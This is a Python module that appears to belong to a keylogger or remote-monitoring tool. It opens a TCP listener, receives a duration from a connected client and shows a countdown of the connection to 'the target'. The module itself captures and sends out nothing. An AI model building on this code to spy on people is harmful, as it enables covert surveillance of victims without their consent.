import time
import socket
from .Server_photos import ServerPhotos
from .Port_data import Ports
import os

class Timer:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def countdown(self, seconds):
        minutes = seconds // 60
        # Calculates the floor
        false_second = minutes * 60
        exact_seconds = seconds - false_second

        print(f"The target is being connected. The Data of the target is coming....")
        while seconds:
            mins, secs = divmod(seconds, 60)
            timer = '{:02d}:{:02d}'.format(mins, secs)
            print(f"\rTime left: {timer}", end="")
            time.sleep(1)
            seconds -= 1

        if minutes == 0:
            print(f"\nSuccessful connection for {exact_seconds} seconds")
        elif exact_seconds == 0:
            print(f"\nSuccessful connection for {minutes} minutes")
        else:
            print(f"\nSuccessful connection for {minutes} minutes and {exact_seconds} seconds")

    def start_timer(self):
        try:
            show_time = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            show_time.bind((self.ip, self.port))
            show_time.listen(10)

            client_socket, ipaddress = show_time.accept()
            full_msg = ServerPhotos.get_data(self, client_socket, "r", 10)
            show_time.close()
            client_socket.close()
            seconds = int(full_msg)
            self.countdown(seconds)

        except OSError:
            working_port = Ports.get_working_ports()
            if str(self.port) in working_port:
                print(f"PLEASE USE AN OTHER PORT NUMBER FOR SERVERKEYLOGGER. PORT NUMBER: {self.port} already in use")
                os._exit(0)
                
